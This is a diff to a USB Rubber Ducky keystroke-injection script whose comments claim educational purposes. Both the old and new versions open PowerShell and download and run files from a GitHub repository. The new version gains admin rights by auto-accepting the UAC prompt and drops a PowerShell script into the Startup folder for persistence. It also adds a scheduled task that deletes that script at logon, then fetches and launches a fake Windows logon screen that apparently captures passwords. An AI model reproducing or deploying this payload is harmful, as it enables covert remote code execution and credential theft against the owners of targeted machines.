@@ -1,24 +1,44 @@
-REM Open PowerShell
-GUI r
 DELAY 500
-STRING powershell
+REM Ducky Script to download and run files, and set one to run at startup once
+REM Educational purposes only, do not use without permission
+
+DELAY 300
+REM Minimize all windows
+WINDOWS d
+DELAY 300
+
+REM Open PowerShell with admin privileges
+WINDOWS r
+DELAY 300
+STRING powershell Start-Process powershell -Verb runAs
 ENTER
 DELAY 1000
+ALT y
+DELAY 800
 
-REM Download the file using PowerShell
-STRING (New-Object Net.WebClient).DownloadFile("https://github.com/CodingRabbi/Ducky-script-Fake-Windows-Logon/raw/main/FakeLogonScreenToFile.exe", "$env:USERPROFILE\Downloads\file.exe")
+REM Download upload_2_db.ps1 and save it in the startup folder
+STRING (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/CodingRabbi/Ducky-script-Fake-Windows-Logon/main/upload_2_db.ps1', '$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\upload_2_db.ps1')
 ENTER
-DELAY 5000
+DELAY 800
 
-REM Run the downloaded file
-STRING Start-Process "$env:USERPROFILE\Downloads\file.exe"
+REM Create a scheduled task to delete the upload_2_db.ps1 file after startup
+STRING $action = New-ScheduledTaskAction -Execute 'cmd.exe' -Argument '/c del $env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\upload_2_db.ps1'
 ENTER
+DELAY 300
+STRING $trigger = New-ScheduledTaskTrigger -AtLogon
+ENTER
+DELAY 300
+STRING $principal = New-ScheduledTaskPrincipal -UserId "BUILTIN\Users" -LogonType Interactive
+ENTER
+DELAY 300
+STRING Register-ScheduledTask -TaskName "RemoveUpload2DbScript" -Action $action -Trigger $trigger -Principal $principal
+ENTER
+DELAY 800
 
-REM Download the PowerShell script using PowerShell
-STRING (New-Object Net.WebClient).DownloadFile("https://raw.githubusercontent.com/CodingRabbi/Ducky-script-Fake-Windows-Logon/main/upload_2_db.ps1", "$env:USERPROFILE\Downloads\upload_2_db.ps1")
+REM Download FakeLogonScreenToFile.exe and run it
+STRING (New-Object System.Net.WebClient).DownloadFile('https://github.com/CodingRabbi/Ducky-script-Fake-Windows-Logon/raw/main/FakeLogonScreenToFile.exe', '$env:TEMP\FakeLogonScreenToFile.exe')
 ENTER
-DELAY 5000
-
-REM Run the downloaded PowerShell script
-STRING powershell -ExecutionPolicy Bypass -File "$env:USERPROFILE\Downloads\upload_2_db.ps1"
+DELAY 800
+STRING Start-Process "$env:TEMP\FakeLogonScreenToFile.exe"
 ENTER
+DELAY 300
